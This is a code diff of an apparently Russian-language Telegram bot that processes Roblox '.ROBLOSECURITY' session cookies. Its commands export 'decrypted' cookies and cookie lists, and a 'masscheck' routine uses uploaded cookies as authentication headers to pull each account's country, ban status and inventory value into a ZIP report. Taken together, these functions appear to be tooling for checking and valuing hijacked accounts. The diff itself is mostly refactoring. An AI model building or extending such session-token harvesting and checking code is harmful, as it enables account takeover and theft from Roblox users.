+            cap_text = caption_prefix
+            if total_pages > 1:
+                cap_text += "\n" + L('inventory_view.page', current=i, total=total_pages)
+
+            if save_dir:
+                _ensure_dir(save_dir)
+                if i == 1:
+                    _write_text(os.path.join(save_dir, "08_Inventory.txt"), cap_text)
+                _write_bytes(os.path.join(save_dir, f"08_Inventory_page{i:02d}.png"), img_bytes)
+            photo = BufferedInputFile(img_bytes, filename=f"inventory_{rid}_{i}.png")
+            await msg.answer_photo(photo, caption=cap_text if i == 1 else cap_text)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
 
 @router.message(Command('export_csv'))
 async def cmd_export_csv(message: types.Message):
     rows = await storage.export_snapshot_rows_for_user(message.from_user.id)
     # header + rows
-    buf = StringIO()
+    buf = io.StringIO()
     buf.write("nick,rid,inventory,spending\n")
     for nick, rid, inv, spent in rows:
         # безопасный CSV (без кавычек, если ник с запятыми — минимально экраним)
@@ -4559,9 +4978,11 @@ async def cmd_export_csv(message: types.Message):
         caption="CSV экспорт из account_snapshots"
     )
 
+
 from io import BytesIO
 from aiogram.types import BufferedInputFile
 from aiogram.filters import Command
+
 
 @router.message(Command('cookie_txt'))
 async def cmd_cookie_txt(message: types.Message):
@@ -4581,10 +5002,6 @@ async def cmd_cookie_txt(message: types.Message):
         BufferedInputFile(data, filename=f"cookie_{rid}.txt"),
         caption=f"roblosecurity (decrypted) для RID {rid}"
     )
-
-
-
-
 
 
 # --- Простая защита от спама и показ меню для обычных пользователей на любое сообщение ---
@@ -4610,6 +5027,7 @@ def _check_antiflood(user_id: int, limit: int = 7, per_seconds: int = 10) -> boo
 from aiogram.types import BufferedInputFile
 from aiogram.fsm.context import FSMContext
 from aiogram.filters import StateFilter, Command
+
 
 # ======================= MASSCHECK (profiles + inventory images to ZIP) =======================
 
@@ -4637,6 +5055,15 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
 
     # Итоговый ZIP с текстом и картинками
     zip_buf = io.BytesIO()
+    # init empty zip so later append-to-BytesIO works reliably
+    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as _zf_init:
+        pass
+    zip_buf.seek(0)
+
+    def _safe_zip_folder(name: str) -> str:
+        name = re.sub(r'[^A-Za-z0-9_.-]+', '_', name).strip('_.')
+        return name[:80] or 'account'
+
     summary_lines = []
     profile_blocks = []
 
@@ -4654,6 +5081,7 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
                     continue
 
                 nickname = user_data.get("name") or f"id{rid}"
+                folder = _safe_zip_folder(f"{idx:02d}_{nickname}_{rid}")
 
                 # глобальный лог masscheck по этому аккаунту
                 await _log_check(tg, rid, scope="mass", what="masscheck")
@@ -4664,7 +5092,6 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
                 all_items = []
                 for arr in by_cat.values():
                     all_items.extend(arr)
-                all_items = _filter_nonzero(all_items)
                 total_items = len(all_items)
                 total_inv_val = _sum_items(all_items)
 
@@ -4682,11 +5109,13 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
                 created = (user_data.get("created") or L('common.na')).split("T")[0]
                 banned = bool(user_data.get("isBanned", False))
 
-                headers = getattr(roblox_client, "_cookie_headers", lambda c: {"Cookie": f".ROBLOSECURITY={c}"})(cleaned_cookie)
+                headers = getattr(roblox_client, "_cookie_headers", lambda c: {"Cookie": f".ROBLOSECURITY={c}"})(
+                    cleaned_cookie)
 
                 country = L('common.dash')
                 try:
-                    r = await client.get('https://accountsettings.roblox.com/v1/account/settings/account-country', headers=headers)
+                    r = await client.get('https://accountsettings.roblox.com/v1/account/settings/account-country',
+                                         headers=headers)
                     if r.status_code == 200:
                         v = (r.json() or {}).get('value', {})
                         country = v.get('localizedName') or v.get('countryName') or L('common.dash')
@@ -4773,7 +5202,7 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
                         title=title,
                     )
                     for page_idx, img_bytes in enumerate(pages, start=1):
-                        img_name = f"inventory_{rid}_{page_idx}.png"
+                        img_name = f"{folder}/inventory_{rid}_{page_idx}.png"
                         img_names.append(img_name)
                         zip_buf_inner = io.BytesIO(img_bytes)
                         zip_buf_inner.seek(0)
@@ -4786,7 +5215,8 @@ async def _run_masscheck_for_doc(message: Message, doc) -> None:
                 )
 
                 # блок профиля для results.txt
-                inv_line = L("masscheck.inv_prefix") + (", ".join(img_names) if img_names else L("masscheck.no_priced_items"))
+                inv_line = L("masscheck.inv_prefix") + (
+                    ", ".join(img_names) if img_names else L("masscheck.no_priced_items"))
                 block = f"=== {nickname} (ID: {rid}) ===\n\n{profile_text}\n\n{inv_line}\n"
                 profile_blocks.append(block)
 
@@ -4837,12 +5267,10 @@ async def masscheck_wait_file(message: Message, state: FSMContext):
     await state.clear()
 
 
-
-
-
 from aiogram.types import BufferedInputFile
 from aiogram.filters import Command
 import io
+
 
 @router.message(Command("export_cookies_txt"))
 async def cmd_export_cookies_txt(msg: types.Message):
@@ -4915,6 +5343,8 @@ async def cmd_export_cookies_txt(msg: types.Message):
 
 
 LAST_MENU_MESSAGES: dict[int, int] = {}
+
+
 @router.message(StateFilter(None))
 async def any_message_show_menu(message: types.Message) -> None:
     """Ловим ЛЮБОЕ сообщение от обычного пользователя и показываем главное меню как при /start.
